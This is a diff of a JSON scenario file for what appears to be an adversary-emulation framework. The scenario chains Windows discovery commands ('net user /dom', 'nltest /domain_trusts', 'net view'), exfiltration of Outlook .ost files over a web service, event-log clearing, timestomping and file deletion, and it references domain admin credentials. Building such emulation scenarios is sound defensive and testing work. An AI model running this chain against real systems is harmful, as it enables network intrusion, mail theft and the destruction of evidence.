+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3"
             },
             "tune": {
                 "command": "netstat -ano"
@@ -987,9 +999,9 @@
             "technique": "LocalAccount",
             "label": "localAccount_t3",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3"
             }
         },
         {
@@ -997,9 +1009,9 @@
             "technique": "DomainAccount",
             "label": "DomainAccount_t3_1",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3"
             },
             "tune": {
                 "command": "cmd /c net user /dom"
@@ -1010,9 +1022,9 @@
             "technique": "DomainAccount",
             "label": "DomainAccount_t3_2",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3"
             },
             "tune": {
                 "command": "cmd /c net user Administrator"
@@ -1023,9 +1035,9 @@
             "technique": "LocalGroups",
             "label": "LocalGroups_t3",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3"
             },
             "tune": {
                 "command": "cmd /c net localgroup administrators"
@@ -1036,9 +1048,9 @@
             "technique": "SystemServiceDiscovery",
             "label": "SystemServiceDiscovery_t3_1",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3"
             },
             "tune": {
                 "command": "cmd /c net start"
@@ -1049,9 +1061,9 @@
             "technique": "SystemServiceDiscovery",
             "label": "SystemServiceDiscovery_t3_2",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3"
             },
             "tune": {
                 "command": "cmd /c net use"
@@ -1062,9 +1074,9 @@
             "technique": "BrowserBookmarkDiscovery",
             "label": "BrowserBookmarkDiscovery_t3",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3"
             }
         },
         {
@@ -1072,9 +1084,9 @@
             "technique": "DomainTrustDiscovery",
             "label": "DomainTrustDiscovery_t3",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3"
             },
             "tune": {
                 "command": "cmd /c nltest /domain_trusts"
@@ -1085,9 +1097,9 @@
             "technique": "LocalEmailCollection",
             "label": "localEmailCollection_t3",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3"
             }
         },
         {
@@ -1095,9 +1107,9 @@
             "technique": "TimeStomp",
             "label": "localEmailCollection_t3",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3"
             }
         },
         {
@@ -1105,9 +1117,9 @@
             "technique": "NetworkShareDiscovery",
             "label": "NetworkShareDiscovery_t3_1",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3"
             }
         },
         {
@@ -1115,9 +1127,9 @@
             "technique": "NetworkShareDiscovery",
             "label": "NetworkShareDiscovery_t3_2",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3"
             },
             "tune": {
                 "command": "cmd /c net view"
@@ -1128,9 +1140,9 @@
             "technique": "SystemNetworkConfigurationDiscovery",
             "label": "systemNetworkConfigurationDiscovery_t3_1",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3"
             },
             "tune": {
                 "command": "route print"
@@ -1141,9 +1153,9 @@
             "technique": "SystemNetworkConfigurationDiscovery",
             "label": "systemNetworkConfigurationDiscovery_t3_2",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3"
             },
             "tune": {
                 "command": "ipconfig /all"
@@ -1154,9 +1166,9 @@
             "technique": "DomainGroups",
             "label": "domainGroups_t3",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3"
             },
             "tune": {
                 "command": "net group /DOMAIN"
@@ -1167,10 +1179,10 @@
             "technique": "ExfiltrationOverWebService",
             "label": "exfiltrationOverWebService_t3",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3",
-                "exfil": "self.exfil"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3",
+                "exfil": "state.exfil"
             },
             "tune": {
                 "exfil_file": "C:\\users\\public\\*.ost"
@@ -1181,10 +1193,10 @@
             "technique": "ExfiltrationOverWebService",
             "label": "exfiltrationOverWebService_t3_1",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "exfil": "self.exfil",
-                "target": "self.target_3"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "exfil": "state.exfil",
+                "target": "state.target_3"
             }
         },
         {
@@ -1192,9 +1204,9 @@
             "technique": "ClearWindowsEventLogs",
             "label": "clearWindowsEventLogs_t3",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3"
             }
         },
         {
@@ -1202,9 +1214,9 @@
             "technique": "FileDeletion",
             "label": "clearWindowsEventLogs_t3",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3"
             },
             "tune": {
                 "file": "C:\\users\\public\\*.ost"
@@ -1215,9 +1227,9 @@
             "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
-                "agent": "self.agent_tgt3",
-                "tool": "self.tool",
-                "target": "self.target_3"
+                "agent": "state.agent_tgt3",
+                "tool": "state.tool",
+                "target": "state.target_3"
             }
         },
         {
@@ -1225,9 +1237,9 @@
             "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             }
         },
         {
@@ -1235,9 +1247,9 @@
             "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             }
         }
     ],
@@ -1372,16 +1384,16 @@
         "targets": {
             "1": {
                 "payload_destination": "c:\\users\\Public",
-                "ioc-taskname": "chimera_15"
+                "ioc-taskname": "chimera_18"
             },
             "2": {
                 "payload_destination": "c:\\users\\Public",
-                "ioc-taskname": "chimera_16"
+                "ioc-taskname": "chimera_44"
             },
             "3": {
                 "query-target_control_ip": "10.10.0.17",
                 "payload_destination": "c:\\users\\Public",
-                "ioc-taskname": "chimera_58",
+                "ioc-taskname": "chimera_82",
                 "query": {
                     "tag": {
                         "domain_controller": "true"
@@ -1390,146 +1402,21 @@
             }
         }
     },
-    "preconditions": {
-        "state": {},
-        "initial": {
-            "tool_name": {
-                "path": [
-                    "tool",
-                    "1",
-                    "name"
-                ]
-            },
-            "payload_name": {
-                "path": [
-                    "tool",
-                    "1",
-                    "ioc-binary_payload_name"
-                ]
-            },
-            "tool": {
-                "path": [
-                    "tool",
-                    "1"
-                ]
-            },
-            "exfil": {
-                "path": [
-                    "exfil",
-                    "1"
-                ]
-            },
-            "driveby": {
-                "path": [
-                    "driveby",
-                    "1"
-                ]
-            },
-            "chimera": {
-                "path": [
-                    "chimera"
-                ]
-            },
-            "target_1": {
-                "path": [
-                    "targets",
-                    "1"
-                ]
-            },
-            "target_2": {
-                "path": [
-                    "targets",
-                    "2"
-                ]
-            },
-            "target_3": {
-                "path": [
-                    "targets",
-                    "3"
-                ]
-            },
-            "target_3_username": {
-                "path": [
-                    "targets",
-                    "2",
-                    "query-domain_admin_username"
-                ]
-            },
-            "target_3_password": {
-                "path": [
-                    "targets",
-                    "2",
-                    "query-domain_admin_password"
-                ]
-            },
-            "target_3_hostname": {
-                "path": [
-                    "targets",
-                    "3",
-                    "query-target_hostname"
-                ]
-            },
-            "target_3_file_location": {
-                "path": [
-                    "targets",
-                    "3",
-                    "payload_destination"
-                ]
-            },
-            "target_3_taskname": {
-                "path": [
-                    "targets",
-                    "3",
-                    "ioc-taskname"
-                ]
-            },
-            "domain": {
-                "path": [
-                    "targets",
-                    "2",
-                    "query-target_domain"
-                ]
-            }
-        },
-        "effects": {
-            "actuator": {
-                "path": [
-                    "actuator",
-                    "actuator",
-                    "ret",
-                    "registered_id"
-                ],
-                "default": 0
-            },
-            "scenario_infrastructure": {
-                "path": [
-                    "infrastructure"
-                ]
-            },
-            "agent_tgt1": {
-                "path": [
-                    "webProtocols_1",
-                    "agent",
-                    "ret",
-                    "agent_id"
-                ]
-            },
-            "agent_tgt2": {
-                "path": [
-                    "webProtocols_2",
-                    "agent",
-                    "ret",
-                    "agent_id"
-                ]
-            },
-            "agent_tgt3": {
-                "path": [
-                    "webProtocols_3",
-                    "agent",
-                    "ret",
-                    "agent_id"
-                ]
-            }
-        }
+    "state": {
+        "tool_name": "spec.tool.1.name",
+        "payload_name": "spec.tool.1.ioc-binary_payload_name",
+        "tool": "spec.tool.1",
+        "exfil": "spec.exfil.1",
+        "driveby": "spec.driveby.1",
+        "chimera": "spec.chimera",
+        "target_1": "spec.targets.1",
+        "target_2": "spec.targets.2",
+        "target_3": "spec.targets.3",
+        "target_3_username": "spec.targets.2.query-domain_admin_username",
+        "target_3_password": "spec.targets.2.query-domain_admin_password",
+        "target_3_hostname": "spec.targets.3.query-target_hostname",
+        "target_3_file_location": "spec.targets.3.payload_destination",
+        "target_3_taskname": "spec.targets.3.ioc-taskname",
+        "domain": "spec.targets.2.query-target_domain"
     }
 }
